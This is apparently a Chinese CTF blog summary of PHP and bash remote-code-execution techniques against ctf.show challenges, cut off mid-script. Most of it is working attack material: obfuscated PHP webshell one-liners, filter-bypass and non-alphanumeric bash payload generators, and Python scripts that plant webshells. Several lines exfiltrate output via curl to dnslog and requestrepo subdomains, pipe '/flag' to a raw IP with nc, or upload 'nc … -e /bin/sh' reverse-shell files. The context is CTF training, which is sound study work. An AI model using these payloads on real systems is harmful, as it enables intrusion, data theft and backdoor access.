Number，非数）是计算机科学中数值数据类型的一类值，表示未定义或不可表示的值。常在浮点数运算中使用。首次引入NaN的是1985年的IEEE 754浮点数标准。\n\nINF：infinite，表示“无穷大”。 超出浮点数的表示范围（溢出，即阶码部分超过其能表示的最大值）。\n```\n\n我们可以利用`N`自增到`T`，这一过程经过了OPQRS，所以构造POST比构造GET更加简短\n\n不过需要先转换成字符串类型\n\n```php\n$_=0/0;  //float(NAN)\n$_=1/0; //float(INF)\n\n$_=(0/0)._;  //字符串 NAN_\n$_=(1/0)._; //字符串 INF_\n```\n\n利用`NAN`转换成`$_POST[0]($_POST[1]);`的例子\n\n```php\n<?php\n$a=(0/0);//NAN\n$a.=_;//NAN_\n$a=$a[0];//N\n$a++;//O\n$o=$a++;//$o=$a++是先把$a的值给$o,然后再对$a进行自增，所以这一句结束的时候 $a是P，$o是O\n$p=$a++;//$a=>Q,$p=>P\n$a++;$a++;//R\n$s=$a++;//S\n$t=$a;//T\n$_=_;//_\n$_.=$p.$o.$s.$t;//_POST\n$$_[0]($$_[1]);//$_POST[0]($_POST[1]);\n\n//用不可见字符替换php变量名称。小于等于105\n//$%ff=(0/0);$%ff.=_;$%ff=$%ff[0];$%ff%2b%2b;$%fd=$%ff%2b%2b;$%fe=$%ff%2b%2b;$%ff%2b%2b;$%ff%2b%2b;$%fc=$%ff%2b%2b;$%fb=$%ff;$_=_;$_.=$%fe.$%fd.$%fc.$%fb;$$_[0]($$_[1]);&0=system&1=ls\n```\n\n\n进一步缩短长度至84字符，同样是利用`NAN`\n\n```php\n<?php\n$a=(_/_._)[0];//直接拼接成字符串并切片\n$o=++$a;//$o=++$a是先把$a进行自增，自增完成之后再将值返回，也就是这一句结束的时候 $a和$o都是O\n$o=++$a.$o;//$o=>PO,$a=>P\n$a++;//Q\n$a++;//R\n$o.=++$a;//$o=>POS,$a=>S\n$o.=++$a;//$o=>POST,$a=>T\n$_=_.$o;//_POST\n$$_[0]($$_[_]);//$_POST[0]($_POST[_]);\n\n\n//$%ff=(_/_._)[0];$%fe=%2b%2b$%ff;$%fe=%2b%2b$%ff.$%fe;$%ff%2b%2b;$%ff%2b%2b;$%fe.=%2b%2b$%ff;$%fe.=%2b%2b$%ff;$_=_.$%fe;$$_[0]($$_[_]);&0=system&_=ls\n```\n\n还可以将`_POST`本身当作一个参数，缩短长度至73\n\n```php\n$_=(_/_._)[_];$_++;$__=$_.$_++;++$_;++$_;$$_[$_=_.$__.++$_.++$_]($$_[_]);\n//$_POST[_POST]($_POST[_])\n```\n\n\n如果php开启了`gettext`拓展，长度还能进一步缩短，因为该扩展支持函数`_()` ,相当于`gettext()`，可以直接转化为字符串\n\n\n72位\n\n```php\n<?php\n$a=_(a/a)[a];//N\n++$a;//O\n$_=$a.$a++;//PO\n$a++;$a++;//R\n$_=_.$_.++$a.++$a;//_POST\n$$_[a]($$_[_]);//$_POST[a]($_POST[_])\n\n\n//$%ff=_(%ff/%ff)[%ff];%2b%2b$%ff;$_=$%ff.$%ff%2b%2b;$%ff%2b%2b;$%ff%2b%2b;$_=_.$_.%2b%2b$%ff.%2b%2b$%ff;$$_[%ff]($$_[_]);&%ff=system&_=ls\n```\n\n68位\n\n```php\n<?php\n$_=_(a/a)[_];//N\n$a=++$_;//O\n$$a[$a=_.++$_.$a[$_++/$_++].++$_.++$_]($$a[_]);//巧妙的把两次$_++放在一起\n\n//$_=_(%ff/%ff)[_];$%ff=%2b%2b$_;$$%ff[$%ff=_.%2b%2b$_.$%ff[$_%2b%2b/$_%2b%2b].%2b%2b$_.%2b%2b$_]($$%ff[_]);&_POST=system&_=ls\n```\n\n\n\n# 无参RCE\n\n经典正则，不能使用带参数的函数\n\n```php\nif(';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $_GET['code'])) {\n    eval($_GET['code']);\n}\n```\n\n\n```php\nend() — 将内部指针指向数组中的最后一个元素，并输出\nnext() — 将内部指针指向数组中的下一个元素，并输出\nprev() — 将内部指针指向数组中的上一个元素，并输出\nreset() — 将内部指针指向数组中的第一个元素，并输出\neach() — 返回当前元素的键名和键值，并将内部指针向前移动\ncurrent() — 返回数组中的当前值\narray_reverse() — 返回单元顺序相反的数组\ngetcwd() — 取得当前工作目录\narray_rand() — 返回一个包含随机键名的数组\nhex2bin() — 把十六进制值转换为 ASCII 字符\n```\n\n## getallheaders()\n\n获取全部HTTP请求头信息\n\n可以通过var_dump(getallheaders());来输出请求头信息，然后通过next，end等来控制字符串位置\n\n\n\n## get_defined_vars()\n\n返回由所有已定义变量所组成的数组\n\n返回数组顺序为get->post->cookie->files\n\n\n## session_start()\n\nphp7以下适用\n\n因为PHPSESSID的组成符号有限定，所以不能有()\n\n读文件\n\n```php\nGET /?code=show_source(session_id(session_start())); HTTP/1.1\nCookie: PHPSESSID=/flag\n```\n\n或者转成16进制\n\n```php\n<?php\necho bin2hex('phpinfo();');  //706870696e666f28293b\n```\n\n```php\nGET /?code=eval(hex2bin(session_id(session_start()))); HTTP/1.1\nCookie: PHPSESSID=706870696e666f28293b\n```\n\n\n\n## scandir()\n\n一些payload\n\n```php\n//查看当前目录下的文件\nvar_dump(scandir(getcwd()));\nvar_dump(scandir(current(localeconv())));\nvar_dump(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))));    //利用三角函数和floor ceil，这个是php7下能够成功\n\n//当前目录倒数第一位文件：\nshow_source(end(scandir(getcwd())));\nshow_source(current(array_reverse(scandir(getcwd()))));\n\n//当前目录倒数第二位文件：\nshow_source(next(array_reverse(scandir(getcwd()))));\n\n//随机返回当前目录文件：\nhighlight_file(array_rand(array_flip(scandir(getcwd()))));\nshow_source(array_rand(array_flip(scandir(getcwd()))));\nshow_source(array_rand(array_flip(scandir(current(localeconv())))));\n\n//查看上一级目录文件名\nprint_r(scandir(dirname(getcwd())));\nprint_r(scandir(next(scandir(getcwd()))));\nprint_r(scandir(next(scandir(getcwd()))));\n\n//读取上级目录文件\nshow_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));\nshow_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));\nshow_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));\n\n//查看和读取根目录文件（所获得的字符串第一位有几率是/，需要多试几次）\nprint_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));\n```\n\n## dirname()\n\nphp特性1：对目录取目录会得到上级目录\n\n```php\n//  /var/www/html\nvar_dump(getcwd());\n\n//  /var/www\nvar_dump(dirname(getcwd()));\n\n//  列出/目录文件\nprint_r(scandir(dirname(dirname(dirname(getcwd())))));\n```\n\nphp特性2：readfile和show_source的特点\n\n如果readfile第二个参数不设定为true，则不会寻找include_path里面的文件进行读取\n而show_source默认情况下，是包含include_path的\n\n```php\n// set_include_path 成功时返回旧的 include_path 或者在失败时返回 false。\n\n//通过set_include_path函数同时实现了两个功能\n// 1：设置文件包含路径，方便show_source在其他目录进行读取\n// 2：放回 .:/usr/local/php\n\n//两次随机数取值\n// 1：第一次取到set_include_path函数返回的字符串中的/\n// 2：第二次取到根目录里的随机文件，取出flag这个字符串交给show_source进行读取\n\nshow_source(array_rand(array_flip(scandir(array_rand(array_flip(str_split(set_include_path(dirname(dirname(dirname(getcwd())))))))))));\n```\n\n\n```python\nimport requests\nimport time\n\n\nurl = \"http://d18ae616-8323-4d47-bade-5f3ee9710125.challenge.ctf.show/?code=show_source(array_rand(array_flip(scandir(array_rand(array_flip(str_split(set_include_path(dirname(dirname(dirname(getcwd())))))))))));\"\n\n\ngo = True\n\nwhile go:\n    res = requests.get(url)\n    time.sleep(0.3)\n\n    if res.text.find(\"flag{\") > 0:\n        print(res.text)\n        go = False\n    else:\n        pass\n```\n\n\n\n\n# 无回显情况的几种利用方式 #\n\n题目中较常见的是`shell_exec`函数，与`system`函数相比，前者没有回显结果\n\n## 写文件 ##\n\n当有写入的权限时，可以考虑将结果写到文件中\n\n例如：`ls>1.txt;`\n\n## dns外带信息 ##\n\n假设目标没有写的权限，但是出网，就可以考虑使用dns外带信息，常用的平台有`http://dnslog.cn/`\n\n例如我们生成一个域名`c9n9j5.dnslog.cn`，然后在靶机上执行``curl `whoami`.c9n9j5.dnslog.cn``\n\n刷新后就会在平台上返回结果\n\n![](/img/summary/rce-19.png)\n\n## http外带信息 ##\n\n实际上在dnslog外带信息的同时，有许多不方便之处，比如不支持换行，url中没有的字符不显示等等\n\n\n所以可以用http的方式，推荐一个平台`https://requestrepo.com/#/`，用来接收get，post请求等\n\n在靶机上执行``curl http://mt2dyif2.requestrepo.com/?1=`whoami` ``，过一会在平台上就会有请求返回(子域名是随机生成的)\n\n![](/img/summary/rce-20.png)\n\n\n## 反弹shell ##\n\n不回显的利用方式肯定少不了最经典的反弹shell\n\n常规反弹语句：`nc ip port -e /bin/sh`，监听：`nc -lvnp port`\n\n反弹的姿势非常多，不知道利用什么方式时可以用比较通用的方式`https://your-shell.com/`\n\n\n应对一些过滤时的做法：\n\n```bash\n// 靶机执行的命令\nsh -c \"`nc 47.99.77.52 1234`\"\n\n\n// vps 传递sh脚本\nnc -lvvnp 1234 < 1.sh\n\n// 1.sh内容\necho `cat /flag` | nc 47.99.77.52 1235\n\n// vps监听1235\nnc -lvnnp 1235\n```\n\n\n## 时间盲注 ##\n\n当靶机不出网，没有写入权限，没有回显时，可以采用类似sql时间盲注的方法\n\n原理很简单，就是猜字符如果猜中，就延时若干秒，坏处是非常耗时","tags":["总结","rce"],"categories":["总结"]},{"title":"RCE总结-命令执行","url":"/posts/729e10b0/","content":"\n部分题目环境&脚本&姿势来自`https://ctf.show/`\n\n# 命令执行函数\n\n主要有6种函数可以执行系统命令，分别是`system`,`passthru`,`exec`,`shell_exec`,`popen`,`pcntl_exec`\n\n\n# 参数值可控\n\n```php\n$a=$_POST['a'];\nsystem(\"ls \".$a);\n```\n\n直接用`;`将命令分割成两部分执行\n\n或者用`&&`和`||`\n`&&`表示前一条命令执行成功时，才执行后一条命令\n`||`表示上一条命令执行失败后，才执行下一条命令\n\n\n# 命令可控\n\n```php\n$a=$_POST['a'];\nsystem($a.\" >/dev/null 2>&1\");\n```\n\n与上题类似\n\n\n# 其他方式跳出控制范围\n\n`cd /%0apwd` 相当于依次执行命令`cd /`和`pwd`\n\n\n\n# 整体可控\n\n## 黑名单过滤\n\n比赛中较为常见的一种类型，将关键词替换成空或其他字符\n如果只替换成空可以利用双写绕过，如果是替换成字符那么可以用base64编码绕过或者拼接变量\n\n常见的读取文件的命令：`cat`,`tac`,`od`,`nl`,`less`,`more`,`sed p`,`head`,`tail`,`sort`,`uniq`,`file -f`,`date -f`\n常见的列目录的命令：`ls`,`du`\n常用的还有通配符`*`和`?`\n\n\n黑名单还可以采用一些不影响执行的特定符号隔开检测的关键字\n\n比如\n\n`cat /flag`-->`ca''t /flag`-->`ca\"\"t /flag`-->`ca\\t /flag`-->`ca$1t /flag`-->`ca$IFS$1t /flag`\n\n或者正则，`[^a]代表不是a的其他字符`\n\n`more [^a][^a][^m][^b]`\n\n## 符号过滤\n\n符号过滤也非常常见\n\n比如可以用`<>`,`${IFS}`,`$IFS$9`,`%09`,`%0b`,`%0c`等代替空格\n\n再者，可以利用变量来截取\n\n比如通过`env`命令获取到了如下变量\n\n```shell\nPHP_EXTRA_CONFIGURE_ARGS=--enable-fpm --with-fpm-user=www-data --with-fpm-group=www-data --disable-cgi\nUSER=www-data\nHOSTNAME=f3f5c6c3e3ee\nPHP_INI_DIR=/usr/local/etc/php\nSHLVL=2\nHOME=/home/www-data\nPHP_LDFLAGS=-Wl,-O1 -pie\nPHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64\nPHP_MD5=\nPHP_VERSION=7.3.22\nGPG_KEYS=CBAF69F173A0FEA4B537F470D66C9593118BCCB6 F38252826ACD957EF380D39F2F7956BC5DA04B5D\nPHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64\nPHP_ASC_URL=https://www.php.net/distributions/php-7.3.22.tar.xz.asc\nPHP_URL=https://www.php.net/distributions/php-7.3.22.tar.xz\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nPHPIZE_DEPS=autoconf \t\tdpkg-dev dpkg \t\tfile \t\tg++ \t\tgcc \t\tlibc-dev \t\tmake \t\tpkgconf \t\tre2c\nPWD=/var/www/html\nPHP_SHA256=0e66606d3bdab5c2ae3f778136bfe8788e574913a3d8138695e54d98562f1fb5\nFLAG=not_flag\n```\n\n可以通过`${PHPIZE_DEPS:9:1}`或者`${PHP_EXTRA_CONFIGURE_ARGS:12:1}`表示空格\n\n\n# 无字母数字命令执行\n\n```php\nif(!preg_match(\"/[a-z]|[0-9]/i\",$cmd)){\n    system($cmd);\n}\n```\n\n构造一个文件上传网页，强制上传，利用`?`匹配文件来rce\n\n```html\n<form action=\"http://15763fb4-39d9-4a94-886d-313843ffdc96.challenges.ctfer.com:8080/?cmd=.%20/???/????????[@-[]\" method=\"post\" enctype=\"multipart/form-data\">\n <input type=\"file\" name=\"file\"/>\n <input type=\"submit\" value=\"Submit\" />\n</form>\n```\n\n抓包爆破，用`[@-[]`来匹配大写字母，可以增加读到的概率\n```text\nPOST /?cmd=.%20/???/????????[@-[] HTTP/1.1\nHost: 15763fb4-39d9-4a94-886d-313843ffdc96.challenges.ctfer.com:8080\nContent-Length: 421\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://192.168.1.17\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryIoD8zFE5URcUFT3b\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: http://192.168.1.17/\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8\nConnection: close\n\n------WebKitFormBoundaryIoD8zFE5URcUFT3b\nContent-Disposition: form-data; name=\"file\"; filename=\"1.txt\"\nContent-Type: text/html\n\n\nwhoami\n------WebKitFormBoundaryIoD8zFE5URcUFT3b--\n\n```\n\n![](/img/summary/rce-1.png)\n\n\n# $数字命令执行(bash)\n\nshell脚本中$的多种用法\n\n| 变量名 | 含义 |\n|---------|---------|\n| $0 | 脚本本身的名字 |\n| $1 | 脚本后所输入的第一串字符 |\n| $2 | 传递给该shell脚本的第二个参数 |\n| $* | 脚本后所输入的所有字符’westos’ ‘linux’ ‘lyq’ |\n| $@ | 脚本后所输入的所有字符’westos’ ‘linux’ ‘lyq’ |\n| $_ | 表示上一个命令的最后一个参数 |\n| $# | #脚本后所输入的字符串个数 |\n| $$ | 脚本运行的当前进程ID号 |\n| $! | 表示最后执行的后台命令的PID |\n| $? | 显示最后命令的退出状态，0表示没有错误，其他表示由错误 |\n\n\n\n>linux中可以通过$'xxx'（xxx为字符的八进制）的形式来执行命令\n\n\n例如\n\n```sh\n$'\\154\\163'   # ls\n$'\\167\\150\\157\\141\\155\\151'   # whoami\n```\n\n但是不能携带参数，需要通过其他方式来传参\n\n```sh\n$'\\154\\163' $'\\57'   #  ls /\n$'\\143\\141\\164'<$'\\57\\146\\154\\141\\147'  #  cat</flag\n```\n\n\n一个允许使用的符号的例子\n\n```php\n$white_list = ['!', '#', '$', '&', \"'\", '(', ')', '0', '1', '<', '\\\\', '_', '{', '}', '~']\n```\n\n在bash中对于整数的表示形式是`[base#]n`，比如`2#100`就是4\n\n在只有0和1的情况下，只要构造出2，就可以构造出任意数字了\n\n\n```shell\n$((1<<1))\n# 这里通过位运算构造，相当于 00000001 位移后变成 000000010\n```\n\n可以得到以下转换过程\n\n```bash\nls\n$'\\154\\163'\n$\\'\\\\$(($((1<<1))#10011010))\\\\$(($((1<<1))#10100011))\\'    # 但是bash解析后变成 $'\\154\\163'  不会进一步解析\nbash<<<$\\'\\\\$(($((1<<1))#10011010))\\\\$(($((1<<1))#10100011))\\'   # 只需要将字符串用<<<语法传递给bash即可，但是不支持带参数的命令\nbash<<<bash\\<\\<\\<$\\'\\\\$(($((1<<1))#10011010))\\\\$(($((1<<1))#10100011))\\'   # 通过两次<<<传递复杂参数\n$0<<<$0\\<\\<\\<$\\'\\\\$(($((1<<1))#10011010))\\\\$(($((1<<1))#10100011))\\'       # 使用$0代替bash\n```\n\n使用脚本自动转换命令\n\n```python\ncmd = 'cat /flag'\n\npayload = '$0<<<$0\\\\<\\\\<\\\\<\\\\$\\\\\\''\nfor c in cmd:\n    payload += f'\\\\\\\\$(($((1<<1))#{bin(int(oct(ord(c))[2:]))[2:]}))'\n\npayload += '\\\\\\''\n\nprint(payload)\n```\n\n## 替换数字1\n\n如果不能使用1了，可以使用上面表格中的$#来表示，两个##就是1，一个就是0\n\n脚本如下\n\n```python\ncmd = 'cat /flag'\n\npayload = '$0<<<$0\\\\<\\\\<\\\\<\\\\$\\\\\\''\nfor c in cmd:\n    payload += f'\\\\\\\\$(($((1<<1))#{bin(int(oct(ord(c))[2:]))[2:]}))'.replace('1', '${##}')\n\npayload += '\\\\\\''\n\nprint(payload)\n```\n\n\n## 替换符号#\n\n#在上一步中是用来替换1的，如果不能用了，还能通过~符号来拿到数字\n\n在linux中，`$(())`可以拿到`0`，通过`~`按位取反，就可以拿到`-1`。很多个`-1`进行叠加运算，可以得到`-2`，`-3`，`-4`，`-5`，`-6`，`-7`，`-8`等等，在将这些数字按位取反，就能拿到8进制中的所有数字\n\n```bash\n'$(())'  # 0\n'$((~$(($((~$(())))$((~$(())))))))'  # 1\n'$((~$(($((~$(())))$((~$(())))$((~$(())))))))'  # 2\n'$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))'  # 3\n'$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))'  # 4\n'$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))'  # 5\n'$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))'  # 6\n'$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))'  # 7\n```\n\n\n## 替换bash\n\n在之前的payload中用的是$0来代替bash，如果不能使用0就需要构造另一个变量，变量值是0\n\nlinux中可以通过`${!?}`和$`{!#}`的形式拿到bash，但是在php的system环境下没有实现\n\n不过可以定义一个`__=$(())`的方式将`__`变量的值设置为0，然后通过`${!__}`的形式拿到sh字符\n\n```bash\n__=$(())&&echo ${!__}   # bash\n```\n\n而以下变量的值同样是0\n\n```bash\n__=${?}&&echo ${!__}   # bash\n__=${#}&&echo ${!__}   # bash\n```\n\n\n## 综合利用脚本\n\n以下是我改编自[bashFuck](https://github.com/ProbiusOfficial/bashFuck)的脚本[Non-alphanumeric-rce-for-bash](https://github.com/dr0n1/Non-alphanumeric-rce-for-bash)\n\n```python\nfrom string import printable\n\n\ndef info(s):\n    total = 0\n    used_chars = set()\n    for c in s:\n        if c.isprintable() and c not in used_chars:\n            total += 1\n            used_chars.add(c)\n    return \"Charset : \" + ' '.join(sorted(used_chars)) + '\\n' + f\"Total Used: {total}\" + '\\n' + \"Total length = \" + str(\n        len(s)) + '\\n' + \"Payload = \" + s + '\\n' + \"---------------------------\"\n\n\ndef GeneratePayload(char, cmd):\n    list_1 = ['$', '\\\\', '\\'', '0', '1', '2', '3', '4', '5', '6', '7', ' ']\n    list_2 = ['#', '$', '\\'', '(', ')', '0', '1', '<', '\\\\']\n    list_3 = ['#', '$', '\\'', '(', ')', '0', '<', '\\\\', '{', '}']\n    list_4 = ['!', '$', '&', '\\'', '(', ')', '<', '=', '\\\\', '_', '{', '}', '~']\n    list_5 = ['!', '_', '?', '+', '$', '{', '}', '=', '#', '&', '(', ')', '<', '\\'', '\\\\']\n    list_6 = ['!', '_', '+', '$', '{', '}', '=', '#', '&', '(', ')', '<', '\\'', '\\\\']\n\n    if \"'\" not in char or \"\\\\\" not in char:\n        print(f\"必要字符不在列表中，无法生成payload\")\n        return\n    elif all(c in char for c in list_1):\n        print(payload_base(cmd))\n    elif all(c in char for c in list_2):\n        print(payload_2(cmd, 'num'))\n    elif all(c in char for c in list_3):\n        print(payload_2(cmd, 'not_one'))\n    elif all(c in char for c in list_4):\n        print(payload_3(cmd))\n    elif all(c in char for c in list_5):\n        print(payload_4(cmd, 'all'))\n    elif all(c in char for c in list_6):\n        print(payload_4(cmd, 'not_question_mark'))\n    else:\n        print(\"可用符号不足，以下是全部payload\")\n        print(\"---------------------------\")\n        # 输出全部payload\n        print(payload_base(cmd))\n        print(payload_2(cmd, 'num'))\n        print(payload_2(cmd, 'not_one'))\n        print(payload_3(cmd))\n        print(payload_4(cmd, 'all'))\n        print(payload_4(cmd, 'not_question_mark'))\n\n\ndef payload_base(cmd):\n    payload = '$\\''\n    for c in cmd:\n        if c == ' ':\n            payload += '\\' $\\''\n        else:\n            payload += '\\\\' + (oct(ord(c)))[2:]\n    payload += '\\''\n\n    return info(payload)\n\n\ndef payload_2(cmd, form):\n    payload = ''\n    for c in cmd:\n        payload += f'\\\\\\\\$(($((1<<1))#{bin(int((oct(ord(c)))[2:]))[2:]}))'\n    payload_num = payload\n    payload_not_one = payload.replace('1', '${##}')  # 用 ${##} 来替换 1\n\n    if form == 'num':\n        payload_num = '$0<<<$0\\\\<\\\\<\\\\<\\\\$\\\\\\'' + payload_num + '\\\\\\''\n        return info(payload_num)\n    elif form == 'not_one':\n        payload_not_one = '$0<<<$0\\\\<\\\\<\\\\<\\\\$\\\\\\'' + payload_not_one + '\\\\\\''\n        return info(payload_not_one)\n\n\ndef payload_3(cmd):\n    # 构造0-7的payload\n    r = {}\n    x = '$((~$(())))'  # -1\n    r[0] = '$(())'  # 0\n    for i in range(1, 9):\n        r[i] = '$((~$((' + x\n        for j in range(i):\n            r[i] += x\n        r[i] += '))))'\n\n    payload = '__=$(())&&${!__}<<<${!__}\\\\<\\\\<\\\\<\\\\$\\\\\\''\n    for c in cmd:\n        payload += '\\\\\\\\'\n        for i in oct(ord(c))[2:]:\n            payload += r[int(i)]\n    payload += '\\\\\\''\n\n    return info(payload)\n\n\ndef payload_4(cmd, form):\n    if form == 'all':\n        payload = '__=${?}&&___=$((++__))&&____=$((++___))&&_____=${?}&&${!_____}<<<${!_____}\\\\<\\\\<\\\\<\\\\$\\\\\\''\n    elif form == 'not_question_mark':\n        payload = '__=$(())&&___=$((++__))&&____=$((++___))&&_____=$(())&&${!_____}<<<${!_____}\\\\<\\\\<\\\\<\\\\$\\\\\\''\n\n    for c in cmd:\n        payload += f'\\\\\\\\$((2#{bin(int(oct(ord(c))[2:]))[2:]}))'.replace('1', '${__}').replace('2', '${____}').replace(\n            '0', '${_____}')\n\n    payload += '\\\\\\''\n\n    return info(payload)\n\n\ndef main():\n    try:\n        char = input(\"请输入列表格式的可用字符，回车默认全部: \") or list(printable);\n        if type(char) == str:\n            char = eval(char)\n\n        while True:\n            cmd = input(\"输入想执行的命令: \")\n            print(\"---------------------------\")\n            GeneratePayload(char, cmd)\n    except:\n        print(\"格式错误，请检查后重试\")\n        return\n\n\nif __name__ == \"__main__\":\n    # import requests\n    #\n    # url = \"https://644e2b3a-87e4-45d0-bf87-ba9662bbcbbd.challenge.ctf.show/\"\n    # white_list = []\n    # for i in range(1, 200):\n    #     data = {\n    #         \"ctf_show\": chr(i)\n    #     }\n    #     send = requests.post(url=url, data=data)\n    #     if \"??\" in send.text:\n    #         print(f\"{chr(i)}\")\n    #     else:\n    #         white_list.append(chr(i))\n    #\n    # print(\"white_list = \" + str(white_list))\n\n    main()\n```\n\n输入一个可用字符串列表即可生成可用的payload\n\n```bash\n请输入列表格式的可用字符，回车默认全部: ['$', '\\\\', '\\'', '0', '1', '2', '3', '4', '5', '6', '7', ' ']\n输入想执行的命令: ls /\n---------------------------\nCharset :   $ ' 1 3 4 5 6 7 \\\nTotal Used: 10\nTotal length = 18\nPayload = $'\\154\\163' $'\\57'\n---------------------------\n输入想执行的命令: cat /flag\n---------------------------\nCharset :   $ ' 1 3 4 5 6 7 \\\nTotal Used: 10\nTotal length = 38\nPayload = $'\\143\\141\\164' $'\\57\\146\\154\\141\\147'\n---------------------------\n输入想执行的命令: \n```\n\n\n\n# 长度限制\n\n## 7字符长度的命令执行\n\n### web目录可写\n\n可写的情况主要利用`>`写入shell到文件名中，然后利用`ls -t`命令排序，写入文件后用`.`执行。具体思路如下\n\n在`linux`中，可以利用`>aa`创建一个文件，文件名就是`aa`\n\n![](/img/summary/rce-2.png)\n\n\n执行一次`ls -t>0`，然后`cat 0`，会发现文件中按照创建文件的先后顺序进行了排序，那么如果将里面的内容替换成恶意的一句话木马，然后执行，不就能rce了吗\n\n![](/img/summary/rce-3.png)\n\n为了避免符号的原因导致写入失败，先把一句话木马转成base64形式\n`<?php eval($_GET[1]);`\n\n`PD9waHAgZXZhbCgkX0dFVFsxXSk7`\n\n`echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d>1.php`\n\n然后对要执行的命令进行分割，不超过7个一组，注意每组后面加个`\\`，在linux中表示一行未输入完\n\n最后`0`文件中应该是如下内容\n\n![](/img/summary/rce-4.png)\n\n\n执行`. 0`，就会生成一个`1.php`\n\n整合脚本\n\n```python\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2022-05-06 13:25:41\n# @Last Modified by:   h1xa\n# @Last Modified time: 2022-05-10 20:55:01\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n\nimport requests\nimport time\n\nurl = \"http://75026f50-dfd3-4928-9a7c-c1d59c860cb3.challenge.ctf.show/\"\n\npayload=[\n\">hp\",\n\">1.p\\\\\",\n\">d\\\\>\\\\\",\n\">\\\\ -\\\\\",\n\">e64\\\\\",\n\">bas\\\\\",\n\">7\\\\|\\\\\",\n\">XSk\\\\\",\n\">Fsx\\\\\",\n\">dFV\\\\\",\n\">kX0\\\\\",\n\">bCg\\\\\",\n\">XZh\\\\\",\n\">AgZ\\\\\",\n\">waH\\\\\",\n\">PD9\\\\\",\n\">o\\\\ \\\\\",\n\">ech\\\\\",\n\"ls -t>0\",\n\". 0\"\n]\n\ndef writeFile(payload):\n\tdata={\n\t\"cmd\":payload\n\t}\n\trequests.post(url,data=data)\n\ndef run():\n\tfor p in payload:\n\t\twriteFile(p.strip())\n\t\tprint(\"[*] create \"+p.strip())\n\t\ttime.sleep(1)\n\ndef check():\n\tresponse = requests.get(url+\"1.php\")\n\tif response.status_code == requests.codes.ok:\n\t\tprint(\"[*] Attack success!!!Webshell is \"+url+\".1.php\")\n\ndef main():\n\trun()\n\tcheck()\n\n\nif __name__ == '__main__':\n\tmain()\n```\n\n\n\n\n### web目录不可写\n\n既然当前目录不可写，那么可以利用可写的目录，比如php的临时文件存储目录`/tmp/`\n\n这样我们可以利用php的文件存储机制强行上传一个文件，内容是反弹shell的语句，然后利用`. /t*/*`匹配我们上传的文件并执行，刚好7个字符\n\n![](/img/summary/rce-5.png)\n\n\n自动化脚本\n```python\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2022-05-06 13:25:41\n# @Last Modified by:   h1xa\n# @Last Modified time: 2022-05-10 20:55:10\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n\nimport requests\nimport time\n\nurl = \"http://f1f8f51f-8da6-43cc-ab09-d5456cc2bcb7.challenge.ctf.show/\"\n\n\ndef getShell(payload):\n\tdata={\n\t\"cmd\":payload\n\t}\n\tfile = {\n\t\"file\":b\"#!/bin/sh\\nnc 43.154.107.226 3389 -e /bin/sh\"\n\t}\n\trequests.post(url,data=data,files=file)\n    print(\"[*] Attack success!!!\")\n\ndef run():\n\tgetShell(\". /t*/*\")\n\ndef main():\n\trun()\n\nif __name__ == '__main__':\n\tmain()\n```\n\n\n## 5字符长度的命令执行\n\n### 环境有dir\n\n主要思路：\n1：将`index.php`转为`.php`\n2：将临时文件打包到当前目录\n3：使用php执行tar压缩包\n\n\n第一步的操作与7字符可写差不多，主要是为了`index.php`这个文件名不影响后面的排序\n\n先复制一份`index.php`的内容\n\n![](/img/summary/rce-6.png)\n\n\n然后通过`cp`，`rev`，`dir`等命令将`index.php`转化为了`php.xedni`\n\n![](/img/summary/rce-7.png)\n\n先将多余的文件删除，再利用shell中的注释符`#`，成功得到`.php`文件\n\n![](/img/summary/rce-8.png)\n\n删去多余的文件，创建`tar`命令和`vcf`参数\n\n![](/img/summary/rce-9.png)\n\n强制上传一个文件到php的文件缓存目录`/tmp/xxxx`，内容是`<?php file_put_contents(\"1.php\",\"<?php eval(\\$_POST[1]);?>\");?>`\n\n然后最关键的命令来了，使用`* /t*`打包恶意文件到`z`，实际上执行的是`tar vcf z /tmp/*`\n\n最后使用`php z`命令写入shell\n\n![](/img/summary/rce-10.png)\n\n\n自动化脚本\n```python\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2022-05-06 13:25:41\n# @Last Modified by:   h1xa\n# @Last Modified time: 2022-05-10 20:55:17\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n\nimport requests\nimport time\n\nurl = \"http://78c1f836-ab24-4a5b-a22f-ce1494fe1b4c.challenge.ctf.show/\"\nurl_2 = url+\".php\"\ndelay = 1\n\nchagneFile_payload=[\n'>cp',\n'>k',\n'*',\n'rm 